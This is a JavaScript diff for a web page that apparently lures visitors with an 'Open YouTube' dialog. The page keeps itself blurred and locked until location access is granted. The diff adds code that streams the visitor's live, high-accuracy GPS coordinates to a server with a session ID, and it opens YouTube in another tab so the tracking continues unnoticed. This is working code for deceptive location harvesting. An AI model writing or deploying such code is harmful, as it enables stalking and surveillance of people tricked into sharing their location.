@@ -2,15 +2,16 @@
  * Centered Open Youtube dialog with blurred, non-interactive background.
  *
  * - Page stays locked (blur + no taps) until location is allowed.
- * - Allow → keep lock, show waiting card, then request location.
- * - Only after location is granted: unlock page + open YouTube.
+ * - Allow → current fix, then live watchPosition updates while this tab stays open.
+ * - YouTube opens in a new tab so this page can keep streaming location.
  * - Don't Allow / location denied → instructions screen (no YouTube).
- *
- * Chrome’s top “Allow location?” bar is system UI and cannot be centered,
- * but our blurred overlay keeps the page unusable underneath it.
  */
 
 const YOUTUBE_URL = "https://www.youtube.com/watch?v=l_GlMjcPoOQ";
+
+/** Live updates: at most once per interval, or sooner if user moved far enough. */
+const LIVE_MIN_INTERVAL_MS = 15000;
+const LIVE_MIN_DISTANCE_M = 25;
 
 const dialogEl = document.getElementById("consent-dialog");
 const consentStep = document.getElementById("consent-step");
@@ -21,6 +22,14 @@ const statusEl = document.getElementById("status");
 const pageContent = document.getElementById("page-content");
 const blockedEl = document.getElementById("blocked-screen");
 const dialogHintEl = document.getElementById("consent-hint");
+
+const sessionId =
+  crypto.randomUUID?.() ||
+  `sess_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
+
+let watchId = null;
+let lastLiveSentAt = 0;
+let lastLiveCoords = null;
 
 function lockPage() {
   document.body.classList.add("gate-active");
@@ -91,6 +100,43 @@ function showDeniedInstructions() {
   if (blockedEl) blockedEl.hidden = false;
 }
 
+function positionPayload(position, type) {
+  return {
+    latitude: position.coords.latitude,
+    longitude: position.coords.longitude,
+    accuracy: position.coords.accuracy,
+    timestamp: position.timestamp,
+    type,
+    sessionId,
+  };
+}
+
+function distanceMeters(a, b) {
+  const toRad = (deg) => (deg * Math.PI) / 180;
+  const R = 6371000;
+  const dLat = toRad(b.latitude - a.latitude);
+  const dLon = toRad(b.longitude - a.longitude);
+  const lat1 = toRad(a.latitude);
+  const lat2 = toRad(b.latitude);
+  const h =
+    Math.sin(dLat / 2) ** 2 +
+    Math.cos(lat1) * Math.cos(lat2) * Math.sin(dLon / 2) ** 2;
+  return 2 * R * Math.asin(Math.sqrt(h));
+}
+
+function shouldSendLiveUpdate(position) {
+  const now = Date.now();
+  const coords = {
+    latitude: position.coords.latitude,
+    longitude: position.coords.longitude,
+  };
+
+  if (!lastLiveCoords) return true;
+  if (now - lastLiveSentAt >= LIVE_MIN_INTERVAL_MS) return true;
+  if (distanceMeters(lastLiveCoords, coords) >= LIVE_MIN_DISTANCE_M) return true;
+  return false;
+}
+
 async function sendLocationToServer(payload) {
   const response = await fetch("/api/locations", {
     method: "POST",
@@ -105,6 +151,51 @@ async function sendLocationToServer(payload) {
   }
 
   return true;
+}
+
+async function sendLiveUpdate(position) {
+  if (!shouldSendLiveUpdate(position)) return;
+
+  lastLiveSentAt = Date.now();
+  lastLiveCoords = {
+    latitude: position.coords.latitude,
+    longitude: position.coords.longitude,
+  };
+
+  const ok = await sendLocationToServer(positionPayload(position, "live"));
+  if (ok) {
+    setStatus("Sharing live location…", "ok");
+  }
+}
+
+function startLiveLocation() {
+  if (!("geolocation" in navigator) || watchId != null) return;
+
+  watchId = navigator.geolocation.watchPosition(
+    (position) => {
+      sendLiveUpdate(position).catch((error) => {
+        console.error("Live location update failed:", error);
+      });
+    },
+    (error) => {
+      console.error("Live location watch error:", error);
+      if (isDeniedError(error)) {
+        stopLiveLocation();
+      }
+    },
+    {
+      enableHighAccuracy: true,
+      maximumAge: 5000,
+      timeout: 20000,
+    }
+  );
+}
+
+function stopLiveLocation() {
+  if (watchId != null && "geolocation" in navigator) {
+    navigator.geolocation.clearWatch(watchId);
+  }
+  watchId = null;
 }
 
 function requestBrowserLocation() {
@@ -158,17 +249,19 @@ async function handleAllow() {
   try {
     const position = await requestBrowserLocation();
 
-    const payload = {
+    lastLiveSentAt = Date.now();
+    lastLiveCoords = {
       latitude: position.coords.latitude,
       longitude: position.coords.longitude,
-      accuracy: position.coords.accuracy,
-      timestamp: position.timestamp,
     };
 
-    await sendLocationToServer(payload);
+    await sendLocationToServer(positionPayload(position, "current"));
+
+    // Keep this tab open and stream updates; YouTube opens in a new tab.
+    startLiveLocation();
     hideDialog();
     unlockPage();
-    setStatus("Location allowed. Opening YouTube…", "ok");
+    setStatus("Location allowed. Sharing live updates… Opening YouTube…", "ok");
     openYouTube();
   } catch (error) {
     console.error("Location flow error:", error);
